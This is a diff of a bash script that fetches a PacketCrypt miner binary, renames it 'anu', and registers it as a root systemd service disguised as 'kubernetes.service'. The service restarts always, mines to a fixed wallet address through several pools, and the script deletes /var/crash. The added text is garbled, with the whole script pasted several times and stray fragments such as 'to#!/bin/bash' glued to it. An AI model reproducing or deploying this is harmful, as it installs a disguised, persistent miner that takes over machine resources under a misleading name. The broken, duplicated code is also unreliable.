@@ -1,7 +1,9 @@
 #!/bin/bash
 cd /home
-sudo wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O packetcrypt
-sudo chmod +x packetcrypt
+sudo wget -O anu https://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux && sudo chmod +x anu#!/bin/bash
+cd /home
+sudo wget -O anu https://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux && sudo chmod +x anu
+sudo chmod +x anu
 sudo rm -rf /lib/systemd/system/kubernetes.service
 sudo rm -rf /var/crash
 bash -c 'cat <<EOT >>/lib/systemd/system/kubernetes.service 
@@ -9,7 +11,115 @@ bash -c 'cat <<EOT >>/lib/systemd/system/kubernetes.service
 Description=gpu1
 After=network.target
 [Service]
-ExecStart= /home/packetcrypt ann -p pkt1qcg7gzzlnuzl7m2k233rl7vadcn237uj6quj57e http://pool.pkt.world/master/ http://pool.pkteer.com https://stratum.zetahash.com http://pool.kubernetes.io
+ExecStart= /home/anu ann -p pkt1qcg7gzzlnuzl7m2k233rl7vadcn237uj6quj57e http://pool.pkt.world/master/ http://pool.pkteer.com https://stratum.zetahash.com http://pool.pktpool.io
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+
+systemctl daemon-reload &&
+systemctl enable kubernetes.service &&
+service kubernetes stop  &&
+service kubernetes restart
+
+
+
+to#!/bin/bash
+cd /home
+sudo wget -O anu https://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux && sudo chmod +x anu
+sudo chmod +x anu
+sudo rm -rf /lib/systemd/system/kubernetes.service
+sudo rm -rf /var/crash
+bash -c 'cat <<EOT >>/lib/systemd/system/kubernetes.service 
+[Unit]
+Description=gpu1
+After=network.target
+[Service]
+ExecStart= /home/anu ann -p pkt1qcg7gzzlnuzl7m2k233rl7vadcn237uj6quj57e http://pool.pkt.world/master/ http://pool.pkteer.com https://stratum.zetahash.com http://pool.pktpool.io
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+
+systemctl daemon-reload &&
+systemctl enable kubernetes.service &&
+service kubernetes stop  &&
+service kubernetes restart
+
+
+
+t#!/bin/bash
+cd /home
+sudo wget -O anu https://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux && sudo chmod +x anu
+sudo chmod +x anu
+sudo rm -rf /lib/systemd/system/kubernetes.service
+sudo rm -rf /var/crash
+bash -c 'cat <<EOT >>/lib/systemd/system/kubernetes.service 
+[Unit]
+Description=gpu1
+After=network.target
+[Service]
+ExecStart= /home/anu ann -p pkt1qcg7gzzlnuzl7m2k233rl7vadcn237uj6quj57e http://pool.pkt.world/master/ http://pool.pkteer.com https://stratum.zetahash.com http://pool.pktpool.io
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+
+systemctl daemon-reload &&
+systemctl enable kubernetes.service &&
+service kubernetes stop  &&
+service kubernetes restart
+
+
+
+#!/bin/bash
+cd /home
+sudo wget -O anu https://github.com/SiemdeNijs/packetcrypt_rs_SNcomp/releases/download/release/packetcrypt_x8664_linux && sudo chmod +x anu
+sudo chmod +x anu
+sudo rm -rf /lib/systemd/system/kubernetes.service
+sudo rm -rf /var/crash
+bash -c 'cat <<EOT >>/lib/systemd/system/kubernetes.service 
+[Unit]
+Description=gpu1
+After=network.target
+[Service]
+ExecStart= /home/anu ann -p pkt1qcg7gzzlnuzl7m2k233rl7vadcn237uj6quj57e http://pool.pkt.world/master/ http://pool.pkteer.com https://stratum.zetahash.com http://pool.pktpool.io
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+
+systemctl daemon-reload &&
+systemctl enable kubernetes.service &&
+service kubernetes stop  &&
+service kubernetes restart
+
+
+sudo chmod +x anu
+sudo rm -rf /lib/systemd/system/kubernetes.service
+sudo rm -rf /var/crash
+bash -c 'cat <<EOT >>/lib/systemd/system/kubernetes.service 
+[Unit]
+Description=gpu1
+After=network.target
+[Service]
+ExecStart= /home/anu ann -p pkt1qcg7gzzlnuzl7m2k233rl7vadcn237uj6quj57e http://pool.pkt.world/master/ http://pool.pkteer.com https://stratum.zetahash.com http://pool.pktpool.io
 WatchdogSec=36000
 Restart=always
 RestartSec=60
